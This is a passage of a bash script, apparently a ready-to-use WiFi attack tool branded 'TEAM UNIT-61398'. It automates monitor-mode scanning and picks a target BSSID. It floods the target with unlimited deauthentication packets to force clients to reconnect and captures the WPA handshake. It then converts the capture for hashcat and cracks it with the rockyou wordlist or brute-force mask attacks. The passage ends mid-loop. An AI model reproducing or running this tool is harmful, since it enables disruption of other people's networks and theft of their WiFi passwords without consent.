#!/bin/bash

# WiFi Penetration Testing Automation Tool
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
WHITE=$'\033[1;37m'
DARK=$'\033[0;37m'
BOLD=$'\033[1m'
NC=$'\033[0m'

hacker_read() {
    local var_name="$1"
    local prompt_text="$2"
    if [[ -n "$prompt_text" ]]; then
        echo -e "$prompt_text"
    fi
    echo -ne "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
    if [[ -n "$var_name" ]]; then
        read "$var_name"
    else
        read
    fi
}

banner() {
    clear
    echo -e "${GREEN}"
    echo "  ██╗    ██╗██╗███████╗██╗     ██████╗ ███████╗███╗   ██╗████████╗"
    echo "  ██║    ██║██║██╔════╝██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝"
    echo "  ██║ █╗ ██║██║█████╗  ██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   "
    echo "  ██║███╗██║██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   "
    echo -e "  ╚███╔███╔╝██║██║     ███████╗██║     ███████╗██║ ╚████║   ██║   "
    echo -e "   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ${NC}"
    local W=66
    local DASHES=$(printf '═%.0s' $(seq 1 $W))
    echo -e "${DARK}╔${DASHES}╗${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${WHITE}C A P T U R E   W I - F I   |   C R A C K   P A S S W O R D${NC}   ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${YELLOW}S E T T I N G   U P   B R U T E F O R C E   A T T A C K${NC}       ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${CYAN}🛡️${NC} ${GREEN}B Y   T E A M   U N I T - 6 1 3 9 8${NC}                          ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${CYAN}🌐${NC} ${WHITE}github.com/UNIT-61398${NC}                                         ${DARK}║${NC}"
    echo -e "${DARK}╚${DASHES}╝${NC}"
    echo ""
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root!${NC}"
        exit 1
    fi
}

setup_output_dir() {
    DESKTOP_DIR=$(eval echo ~$(logname 2>/dev/null || echo $SUDO_USER)/Desktop 2>/dev/null)
    if [[ ! -d "$DESKTOP_DIR" ]]; then
        DESKTOP_DIR=$(eval echo ~/Desktop)
    fi
    OUTPUT_DIR="$DESKTOP_DIR/WI-FI Pentest"
    if [[ ! -d "$OUTPUT_DIR" ]]; then
        mkdir -p "$OUTPUT_DIR"
        echo -e "${GREEN}[+] Created folder: $OUTPUT_DIR${NC}"
    fi
    echo -e "${YELLOW}[*] All files will be saved in: $OUTPUT_DIR${NC}"
    CAP_FILE_PATH="$OUTPUT_DIR"
}

select_interface() {
    echo -e "${YELLOW}[*] Detecting wireless interfaces...${NC}"
    IFS=$'\n' read -rd '' -a INTERFACES <<< "$(iwconfig 2>/dev/null | grep -o '^[^ ]*')"

    if [[ ${#INTERFACES[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No wireless interfaces found${NC}"
        exit 1
    elif [[ ${#INTERFACES[@]} -eq 1 ]]; then
        echo -e "${GREEN}[+] Found 1 wireless interface: ${INTERFACES[0]}${NC}"
        hacker_read CONFIRM "${CYAN}[?] Use ${INTERFACES[0]}? (Y/n):${NC}"
        if [[ "$CONFIRM" == "n" || "$CONFIRM" == "N" ]]; then
            hacker_read INTERFACE "${CYAN}[?] Enter wireless interface name manually:${NC}"
        else
            INTERFACE="${INTERFACES[0]}"
        fi
    else
        echo -e "${YELLOW}[*] Multiple wireless interfaces found:${NC}"
        local idx=0
        for iface in "${INTERFACES[@]}"; do
            echo "  $((idx+1))) $iface"
            ((idx++))
        done
        echo ""
        hacker_read CHOICE "${CYAN}[?] Select interface number or enter name manually:${NC}"
        if [[ "$CHOICE" =~ ^[0-9]+$ ]] && (( CHOICE >= 1 && CHOICE <= ${#INTERFACES[@]} )); then
            INTERFACE="${INTERFACES[$((CHOICE-1))]}"
        else
            INTERFACE="$CHOICE"
        fi
    fi

    MON_INTERFACE="${INTERFACE}mon"
    echo -e "${GREEN}[+] Selected interface: $INTERFACE -> Monitor: $MON_INTERFACE${NC}"
}

kill_interfering() {
    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
    airmon-ng check kill
    systemctl stop NetworkManager 2>/dev/null
    systemctl stop wpa_supplicant 2>/dev/null
    echo -e "${GREEN}[+] Done${NC}"
}

enable_monitor() {
    echo -e "${YELLOW}[*] Enabling monitor mode on $INTERFACE...${NC}"
    airmon-ng start "$INTERFACE"
    sleep 2
    if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${YELLOW}[*] Retrying monitor mode...${NC}"
        airmon-ng start "$INTERFACE" 2>/dev/null
        sleep 2
    fi
    echo -e "${GREEN}[+] Monitor mode enabled: $MON_INTERFACE${NC}"
}

scan_networks() {
    local SCAN_DURATION=25
    local SCAN_FILE

    while true; do
        SCAN_FILE="/tmp/wifiscan_$(date +%s)"
        echo -e "${YELLOW}[*] Scanning for WiFi networks... (${SCAN_DURATION} seconds)${NC}"

        airodump-ng -w "$SCAN_FILE" --output-format csv "$MON_INTERFACE" > /dev/null 2>&1 &
        local SCAN_PID=$!

        local REMAINING=$SCAN_DURATION
        while [[ $REMAINING -gt 0 ]]; do
            echo -ne "\r    Time remaining: ${CYAN}${REMAINING}${NC} seconds    "
            sleep 1
            ((REMAINING--))
        done
        echo -ne "\r    Time remaining: ${CYAN}0${NC} seconds    \n"

        kill "$SCAN_PID" 2>/dev/null
        wait "$SCAN_PID" 2>/dev/null
        sleep 1

        echo -e "${GREEN}[+] Scan complete. Available networks:${NC}"
        local CSV_FILE="${SCAN_FILE}-01.csv"
        if [[ -f "$CSV_FILE" ]]; then
            awk -F',' 'NR>2 && $1 ~ /^[[:space:]]*[0-9A-Fa-f]{2}:/ {
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14);
                if (length($1) == 17 && $14 != "") {
                    printf "  BSSID: %-20s Ch: %-3s ESSID: %s\n", $1, $4, $14;
                }
            }' "$CSV_FILE"
        fi

        echo ""
        hacker_read USER_BSSID "${CYAN}[?] Enter target BSSID (or press Enter to scan again):${NC}"

        if [[ -n "$USER_BSSID" ]]; then
            BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
            if [[ -f "$CSV_FILE" ]]; then
                CHANNEL=$(awk -F',' -v bssid="$BSSID" 'NR>2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1); if (toupper($1) == toupper(bssid)) {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4); print $4; exit}}' "$CSV_FILE" | tr -d ' ')
            fi
            rm -f "${SCAN_FILE}"* 2>/dev/null
            break
        fi

        SCAN_DURATION=$((SCAN_DURATION + 10))
        rm -f "${SCAN_FILE}"* 2>/dev/null
        echo -e "${YELLOW}[*] Extending scan by 10 seconds (next: ${SCAN_DURATION}s)${NC}"
    done
}

scan_networks_terminal() {
    local SCAN_DURATION=25
    local SCAN_FILE
    local NOTIFY_FILE="/tmp/scan_done_$$"
    local SCAN_SCRIPT="/tmp/wifi_scan_$$.sh"

    while true; do
        SCAN_FILE="/tmp/wifiscan_$$"

        cat > "$SCAN_SCRIPT" << 'SCANEOF2'
#!/bin/bash
SCAN_FILE="$1"
MON="$2"
NOTIFY="$3"
DURATION="$4"

airodump-ng -w "$SCAN_FILE" --output-format csv "$MON" 2>/dev/null &
SCAN_PID=$!

for ((i=DURATION; i>0; i--)); do
    echo -ne "\rScanning... ${i}s remaining"
    sleep 1
done

kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null
touch "$NOTIFY"
SCANEOF2
        chmod +x "$SCAN_SCRIPT"

        local TERMINAL=$(detect_terminal)
        echo -e "${YELLOW}[*] Scanning for WiFi networks... (${SCAN_DURATION} seconds)${NC}"

        case "$TERMINAL" in
            gnome-terminal)
                gnome-terminal -- bash -c "\"$SCAN_SCRIPT\" \"$SCAN_FILE\" \"$MON_INTERFACE\" \"$NOTIFY_FILE\" \"$SCAN_DURATION\"" 2>/dev/null &
                ;;
            konsole)
                konsole --hold -e "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" 2>/dev/null &
                ;;
            x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
                $TERMINAL -e "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" 2>/dev/null &
                ;;
            *)
                bash "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" &
                ;;
        esac

        while [[ ! -f "$NOTIFY_FILE" ]]; do
            sleep 1
        done

        echo -e "${GREEN}[+] Scan complete. Available networks:${NC}"
        local CSV_FILE="${SCAN_FILE}-01.csv"
        if [[ -f "$CSV_FILE" ]]; then
            awk -F',' 'NR>2 && $1 ~ /^[[:space:]]*[0-9A-Fa-f]{2}:/ {
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14);
                if (length($1) == 17 && $14 != "") {
                    printf "  BSSID: %-20s Ch: %-3s ESSID: %s\n", $1, $4, $14;
                }
            }' "$CSV_FILE"
        fi

        echo ""
        hacker_read USER_BSSID "${CYAN}[?] Enter target BSSID (or press Enter to scan again):${NC}"

        if [[ -n "$USER_BSSID" ]]; then
            BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
            if [[ -f "$CSV_FILE" ]]; then
                CHANNEL=$(awk -F',' -v bssid="$BSSID" 'NR>2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1); if (toupper($1) == toupper(bssid)) {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4); print $4; exit}}' "$CSV_FILE" | tr -d ' ')
            fi
            rm -f "${SCAN_FILE}"* "$NOTIFY_FILE" "$SCAN_SCRIPT" 2>/dev/null
            break
        fi

        SCAN_DURATION=$((SCAN_DURATION + 10))
        rm -f "${SCAN_FILE}"* "$NOTIFY_FILE" 2>/dev/null
        echo -e "${YELLOW}[*] Extending scan by 10 seconds (next: ${SCAN_DURATION}s)${NC}"
    done
}

list_existing_caps() {
    echo -e "${YELLOW}[*] Existing .cap files in $OUTPUT_DIR :${NC}"
    CAPS=$(ls "$OUTPUT_DIR"/*.cap 2>/dev/null | xargs -n1 basename 2>/dev/null)
    if [[ -z "$CAPS" ]]; then
        echo "  (no existing .cap files)"
    else
        echo "$CAPS" | sed 's/^/  - /'
    fi
    echo ""
}

generate_filename() {
    local base="$1"
    if [[ ! -f "${CAP_FILE_PATH}/${base}.cap" ]]; then
        echo "$base"
        return
    fi
    local counter=1
    while [[ -f "${CAP_FILE_PATH}/${base}-${counter}.cap" ]]; do
        ((counter++))
    done
    echo "${base}-${counter}"
}

set_target() {
    list_existing_caps

    if [[ -z "$BSSID" ]]; then
        hacker_read BSSID "${CYAN}[?] Enter target BSSID (e.g., 00:11:22:33:44:55):${NC}"
    fi
    if [[ -z "$CHANNEL" ]]; then
        hacker_read CHANNEL "${CYAN}[?] Enter target channel:${NC}"
    fi

    DEFAULT_NAME="capture"
    SUGGESTED=$(generate_filename "$DEFAULT_NAME")
    hacker_read CAP_INPUT "${CYAN}[?] Enter capture file name [${SUGGESTED}]:${NC}"
    if [[ -z "$CAP_INPUT" ]]; then
        CAP_INPUT="$SUGGESTED"
    fi

    FINAL_NAME=$(generate_filename "$CAP_INPUT")
    if [[ "$FINAL_NAME" != "$CAP_INPUT" ]]; then
        echo -e "${YELLOW}[!] '${CAP_INPUT}.cap' already exists. Using '${FINAL_NAME}.cap' instead.${NC}"
    fi

    CAP_FILE="${CAP_FILE_PATH}/${FINAL_NAME}"
}

detect_terminal() {
    if command -v x-terminal-emulator &>/dev/null; then
        echo "x-terminal-emulator"
    elif command -v gnome-terminal &>/dev/null; then
        echo "gnome-terminal"
    elif command -v xterm &>/dev/null; then
        echo "xterm"
    elif command -v xfce4-terminal &>/dev/null; then
        echo "xfce4-terminal"
    elif command -v konsole &>/dev/null; then
        echo "konsole"
    elif command -v lxterminal &>/dev/null; then
        echo "lxterminal"
    elif command -v mate-terminal &>/dev/null; then
        echo "mate-terminal"
    elif command -v terminator &>/dev/null; then
        echo "terminator"
    elif command -v urxvt &>/dev/null; then
        echo "urxvt"
    elif command -v rxvt &>/dev/null; then
        echo "rxvt"
    else
        echo "none"
    fi
}

capture_and_deauth() {
    local ERR_FILE="/tmp/wifi_err_$$"
    local PID_FILE="/tmp/wifi_pids_$$"
    local CAP_SCRIPT="/tmp/wifi_cap_$$.sh"

    cat > "$CAP_SCRIPT" << SCRIPTEOF
#!/bin/bash
BSSID="${BSSID}"
CHANNEL="${CHANNEL}"
MON="${MON_INTERFACE}"
CAP="${CAP_FILE}"
ERR="${ERR_FILE}"
PIDF="${PID_FILE}"
SCRIPTEOF
    cat >> "$CAP_SCRIPT" << 'SCRIPTEOF'
PATH="/usr/sbin:/sbin:$PATH"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${RED}⚡${NC} HANDSHAKE CAPTURE IN PROGRESS ${RED}⚡${NC}  ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*]${NC} Target BSSID: ${GREEN}$BSSID${NC}"
echo -e "${YELLOW}[*]${NC} Channel:      ${GREEN}$CHANNEL${NC}"
echo -e "${YELLOW}[*]${NC} Interface:    ${GREEN}$MON${NC}"
echo -e "${YELLOW}[*]${NC} Output:       ${GREEN}${CAP}.cap${NC}"
echo ""

if ! iwconfig "$MON" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo -e "${RED}[!] Monitor interface $MON not found!${NC}"
    sleep 3
    exit 1
fi

echo -e "${YELLOW}[*] Starting packet capture...${NC}"
airodump-ng -w "$CAP" -c "$CHANNEL" --bssid "$BSSID" "$MON" 2>"$ERR" &
AIDUMP_PID=$!

sleep 3

echo -e "${RED}[!] Sending continuous deauth packets...${NC}"
aireplay-ng --deauth 0 -a "$BSSID" "$MON" &
AIREPLAY_PID=$!

echo "$AIDUMP_PID" > "$PIDF"
echo "$AIREPLAY_PID" >> "$PIDF"

echo -e "${YELLOW}[*] Waiting for device to reconnect and capture WPA handshake...${NC}"
echo ""

while true; do
    if grep -q "WPA handshake" "$ERR" 2>/dev/null; then
        echo ""
        echo -e "${GREEN}[+] WPA HANDSHAKE CAPTURED SUCCESSFULLY!${NC}"
        echo ""
        kill $AIREPLAY_PID 2>/dev/null
        wait $AIREPLAY_PID 2>/dev/null
        kill $AIDUMP_PID 2>/dev/null
        wait $AIDUMP_PID 2>/dev/null
        rm -f "$ERR" "$PIDF"
        echo -e "${GREEN}[+] Deauth stopped. Devices can now reconnect.${NC}"
        echo -e "${GREEN}[+] Capture saved to: ${CAP}.cap${NC}"
        echo ""
        echo -e "${YELLOW}[*] You can close this window now.${NC}"
        sleep 5
        break
    fi
    sleep 1
done
SCRIPTEOF
    chmod +x "$CAP_SCRIPT"

    local TERMINAL=$(detect_terminal)

    case "$TERMINAL" in
        gnome-terminal)
            gnome-terminal -- bash -c "\"$CAP_SCRIPT\"" 2>/dev/null &
            ;;
        konsole)
            konsole --hold -e "$CAP_SCRIPT" 2>/dev/null &
            ;;
        x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
            $TERMINAL -e "$CAP_SCRIPT" 2>/dev/null &
            ;;
        *)
            echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
            apt-get install -y xterm 2>/dev/null
            if command -v xterm &>/dev/null; then
                xterm -e "$CAP_SCRIPT" 2>/dev/null &
            else
                echo -e "${YELLOW}[*] Running capture in background instead...${NC}"
                bash "$CAP_SCRIPT" &
            fi
            ;;
    esac

    echo ""
    echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal window has been opened.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Check it for handshake capture progress.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}When the handshake is captured, press ENTER here to continue.${NC}"
    echo ""
    hacker_read "" "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER when handshake is captured:"

    if [[ -f "$PID_FILE" ]]; then
        while read PID; do
            kill "$PID" 2>/dev/null
            wait "$PID" 2>/dev/null
        done < "$PID_FILE"
        rm -f "$PID_FILE"
    fi
    rm -f "$CAP_SCRIPT" 2>/dev/null
    CAPTURE_FILE=$(ls -t "${CAP_FILE}"-*.cap 2>/dev/null | head -1)
    if [[ -z "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE="${CAP_FILE}.cap"
    fi
    echo -e "${GREEN}[+] Continuing with captured handshake...${NC}"
    echo -e "${GREEN}[+] Capture file: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
}

stop_monitor() {
    echo -e "${YELLOW}[*] Stopping monitor mode...${NC}"
    airmon-ng stop "$MON_INTERFACE"
    echo -e "${GREEN}[+] Monitor mode stopped${NC}"
}

prepare_wordlist() {
    if [[ -z "$OUTPUT_DIR" ]]; then
        setup_output_dir
    fi

    local ROCKY_OUT="$OUTPUT_DIR/rockyou.txt"
    WORDLIST=""

    if [[ -f "$ROCKY_OUT" ]]; then
        echo -e "${GREEN}[+] Using existing: ${WHITE}$ROCKY_OUT${NC}"
        WORDLIST="$ROCKY_OUT"
        return
    fi

    local SEARCH_PATHS=(
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.tar.gz"
        "/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt"
    )

    for SRC in "${SEARCH_PATHS[@]}"; do
        if [[ -f "$SRC" ]]; then
            echo -e "${YELLOW}[*] Found: ${WHITE}$SRC${NC}"
            if [[ "$SRC" == *.gz ]]; then
                echo -e "${YELLOW}[*] Extracting to output folder...${NC}"
                gzip -d -c "$SRC" > "$ROCKY_OUT" 2>/dev/null
            else
                cp "$SRC" "$ROCKY_OUT" 2>/dev/null
            fi
            if [[ -f "$ROCKY_OUT" ]]; then
                echo -e "${GREEN}[+] Wordlist ready: ${WHITE}$ROCKY_OUT${NC}"
                WORDLIST="$ROCKY_OUT"
                return
            fi
            break
        fi
    done

    echo -e "${YELLOW}[*] rockyou.txt not found. Attempting to install wordlists...${NC}"
    apt-get install -y wordlist 2>/dev/null || apt-get install -y seclists 2>/dev/null

    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        gzip -d -c "/usr/share/wordlists/rockyou.txt.gz" > "$ROCKY_OUT" 2>/dev/null
    elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
        cp "/usr/share/wordlists/rockyou.txt" "$ROCKY_OUT" 2>/dev/null
    fi

    if [[ -f "$ROCKY_OUT" ]]; then
        echo -e "${GREEN}[+] Wordlist ready: ${WHITE}$ROCKY_OUT${NC}"
        WORDLIST="$ROCKY_OUT"
    else
        echo -e "${RED}[!] Could not locate or install rockyou.txt${NC}"
        hacker_read WORDLIST "${CYAN}[?] Enter path to wordlist manually:${NC}"
    fi
}

mask_attack() {
    setup_output_dir

    local CAP_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
    if [[ -z "$CAP_FILE" ]]; then
        echo -e "${RED}[!] No .cap files found. Capture a handshake first.${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] Using capture: ${WHITE}$(basename "$CAP_FILE")${NC}"

    if ! command -v hashcat &>/dev/null; then
        echo -e "${YELLOW}[*] Installing hashcat...${NC}"
        apt-get install -y hashcat 2>/dev/null
    fi

    echo -e "${YELLOW}[*] Checking for WPA handshake in capture...${NC}"
    local HANDSHAKE_CHECK=$(aircrack-ng "$CAP_FILE" 2>&1 | grep -c "1 handshake")
    if [[ "$HANDSHAKE_CHECK" -eq 0 ]]; then
        echo -e "${RED}[!] No WPA handshake found in capture file.${NC}"
        echo -e "${YELLOW}[*] Capture the handshake first using option 4.${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] WPA handshake confirmed.${NC}"

    local HCCAPX="${CAP_FILE%.cap}.hccapx"
    local HC22000="${CAP_FILE%.cap}.22000"
    local HASH_FILE=""
    local HASH_MODE=""

    if command -v hcxpcapngtool &>/dev/null; then
        echo -e "${YELLOW}[*] Converting using hcxpcapngtool (22000 format)...${NC}"
        hcxpcapngtool -o "$HC22000" "$CAP_FILE" 2>&1
        if [[ -f "$HC22000" && -s "$HC22000" ]]; then
            HASH_FILE="$HC22000"
            HASH_MODE="22000"
            echo -e "${GREEN}[+] Converted: ${WHITE}$(basename "$HC22000")${NC}"
        fi
    fi

    if [[ -z "$HASH_FILE" ]]; then
        if ! command -v cap2hccapx &>/dev/null; then
            echo -e "${YELLOW}[*] Installing hcxtools...${NC}"
            apt-get install -y hcxtools 2>/dev/null
        fi
        if command -v cap2hccapx &>/dev/null; then
            echo -e "${YELLOW}[*] Converting using cap2hccapx (hccapx format)...${NC}"
            cap2hccapx "$CAP_FILE" "$HCCAPX"
            if [[ -f "$HCCAPX" ]]; then
                HASH_FILE="$HCCAPX"
                HASH_MODE="2500"
                echo -e "${GREEN}[+] Converted: ${WHITE}$(basename "$HCCAPX")${NC}"
            fi
        fi
    fi

    if [[ -z "$HASH_FILE" ]]; then
        echo -e "${RED}[!] Conversion failed. Could not convert capture to hashcat format.${NC}"
        return 1
    fi

    local GLOBAL_DONE=false
    local MIN_LEN=8
    local MAX_LEN=22

    echo ""
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}              ${YELLOW}SET PASSWORD LENGTH RANGE${NC}                         ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    hacker_read MIN_LEN "${YELLOW}[*]${NC} Minimum password length ${DARK}(default: 8)${NC}:"
    MIN_LEN="${MIN_LEN:-8}"
    hacker_read MAX_LEN "${YELLOW}[*]${NC} Maximum password length ${DARK}(default: 22)${NC}:"
    MAX_LEN="${MAX_LEN:-22}"
    echo -e "${GREEN}[+]${NC} Length range: ${WHITE}${MIN_LEN}-${MAX_LEN}${NC} characters"
    echo ""

    while [[ "$GLOBAL_DONE" == false ]]; do
        local CHARSET_LABEL=""
        local CHARSET_BUILTIN=""
        local CUSTOM_CHARSET=""

        echo ""
        echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║${NC}              ${YELLOW}SELECT CHARACTER COMBINATION${NC}                   ${CYAN}║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1${NC})  Uppercase only           ${DARK}(A-Z)${NC}"
        echo -e "  ${GREEN}2${NC})  Lowercase only           ${DARK}(a-z)${NC}"
        echo -e "  ${GREEN}3${NC})  Digits only               ${DARK}(0-9)${NC}"
        echo -e "  ${GREEN}4${NC})  Special only              ${DARK}(!@#...)${NC}"
        echo -e "  ${GREEN}5${NC})  U + L                    ${DARK}(A-Z + a-z)${NC}"
        echo -e "  ${GREEN}6${NC})  U + D                    ${DARK}(A-Z + 0-9)${NC}"
        echo -e "  ${GREEN}7${NC})  U + S                    ${DARK}(A-Z + !@#...)${NC}"
        echo -e "  ${GREEN}8${NC})  L + D                    ${DARK}(a-z + 0-9)${NC}"
        echo -e "  ${GREEN}9${NC})  L + S                    ${DARK}(a-z + !@#...)${NC}"
        echo -e "  ${GREEN}10${NC}) D + S                    ${DARK}(0-9 + !@#...)${NC}"
        echo -e "  ${GREEN}11${NC}) U + L + D                ${DARK}(A-Z a-z 0-9)${NC}"
        echo -e "  ${GREEN}12${NC}) U + L + S                ${DARK}(A-Z a-z !@#...)${NC}"
        echo -e "  ${GREEN}13${NC}) U + D + S                ${DARK}(A-Z 0-9 !@#...)${NC}"
        echo -e "  ${GREEN}14${NC}) L + D + S                ${DARK}(a-z 0-9 !@#...)${NC}"
        echo -e "  ${GREEN}15${NC}) U + L + D + S            ${DARK}(All 4 categories)${NC}"
        echo ""
        echo -e "  ${RED}q${NC}) Quit mask attack"
        echo ""
        hacker_read CHARSET_CHOICE "${CYAN}[?]${NC} Select ${DARK}(1-15 or q)${NC}:"

        case "$CHARSET_CHOICE" in
            1)  CHARSET_LABEL="Uppercase (A-Z)";         CHARSET_BUILTIN="u"; CUSTOM_CHARSET="" ;;
            2)  CHARSET_LABEL="Lowercase (a-z)";         CHARSET_BUILTIN="l"; CUSTOM_CHARSET="" ;;
            3)  CHARSET_LABEL="Digits (0-9)";             CHARSET_BUILTIN="d"; CUSTOM_CHARSET="" ;;
            4)  CHARSET_LABEL="Special (!@#...)";         CHARSET_BUILTIN="s"; CUSTOM_CHARSET="" ;;
            5)  CHARSET_LABEL="U + L";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l" ;;
            6)  CHARSET_LABEL="U + D";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?d" ;;
            7)  CHARSET_LABEL="U + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?s" ;;
            8)  CHARSET_LABEL="L + D";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?d" ;;
            9)  CHARSET_LABEL="L + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?s" ;;
            10) CHARSET_LABEL="D + S";                    CHARSET_BUILTIN="";  CUSTOM_CHARSET="?d?s" ;;
            11) CHARSET_LABEL="U + L + D";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?d" ;;
            12) CHARSET_LABEL="U + L + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?s" ;;
            13) CHARSET_LABEL="U + D + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?d?s" ;;
            14) CHARSET_LABEL="L + D + S";                CHARSET_BUILTIN="";  CUSTOM_CHARSET="?l?d?s" ;;
            15) CHARSET_LABEL="U + L + D + S";            CHARSET_BUILTIN="";  CUSTOM_CHARSET="?u?l?d?s" ;;
            q|Q) echo -e "${YELLOW}[*] Mask attack cancelled.${NC}"; return 0 ;;
            *) echo -e "${RED}[!] Invalid option${NC}"; continue ;;
        esac

        echo -e "${GREEN}[+] Selected: ${WHITE}$CHARSET_LABEL${NC}"

        echo ""
        echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║${NC}  ${YELLOW}⚠ WARNING:${NC} Mask/brute-force attack is extremely                 ${RED}║${NC}"
        echo -e "${RED}║${NC}  ${YELLOW}time-consuming!${NC} It can take from hours to YEARS                  ${RED}║${NC}"
        echo -e "${RED}║${NC}  depending on password complexity and your hardware.                           ${RED}║${NC}"
        echo -e "${RED}║${NC}                                                                               ${RED}║${NC}"
        echo -e "${RED}║${NC}  ${WHITE}Character set:${NC} $CHARSET_LABEL                                       ${RED}║${NC}"
        echo -e "${RED}║${NC}  ${WHITE}Length range:${NC}  ${MIN_LEN}-${MAX_LEN} characters                                       ${RED}║${NC}"
        echo -e "${RED}║${NC}                                                                               ${RED}║${NC}"
        echo -e "${RED}║${NC}  ${WHITE}Tip:${NC} A wordlist attack (option 5) is much faster.                    ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        hacker_read PROCEED "${CYAN}[?]${NC} Start attack with this charset? ${DARK}(y/n)${NC}:"
        if [[ "$PROCEED" != "y" && "$PROCEED" != "Y" ]]; then
            echo -e "${YELLOW}[*] Skipped this charset.${NC}"
            continue
        fi

        local MASK_SCRIPT="/tmp/wifi_mask_$$.sh"
        local RESULT_FILE="/tmp/wifi_mask_result_$$"

        cat > "$MASK_SCRIPT" << MASKEOF
#!/bin/bash
HASH_FILE="$HASH_FILE"
HASH_MODE="$HASH_MODE"
CHARSET_BUILTIN="$CHARSET_BUILTIN"
CUSTOM_CHARSET="$CUSTOM_CHARSET"
CHARSET_LABEL="$CHARSET_LABEL"
RESULT_FILE="$RESULT_FILE"
MIN_LEN="$MIN_LEN"
MAX_LEN="$MAX_LEN"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "\${CYAN}╔══════════════════════════════════════════╗\${NC}"
echo -e "\${CYAN}║\${NC}  \${YELLOW}⚡\${NC} HASHCAT MASK ATTACK \${YELLOW}⚡\${NC}               \${CYAN}║\${NC}"
echo -e "\${CYAN}╚══════════════════════════════════════════╝\${NC}"
echo ""
echo -e "\${YELLOW}[*]\${NC} Target:      \${GREEN}\$HASH_FILE\${NC}"
echo -e "\${YELLOW}[*]\${NC} Mode:        \${GREEN}-m \$HASH_MODE\${NC}"
echo -e "\${YELLOW}[*]\${NC} Charset:     \${GREEN}\$CHARSET_LABEL\${NC}"
echo ""

for ((i=\${MIN_LEN}; i<=\${MAX_LEN}; i++)); do
    MASK=""
    for ((j=0; j<i; j++)); do
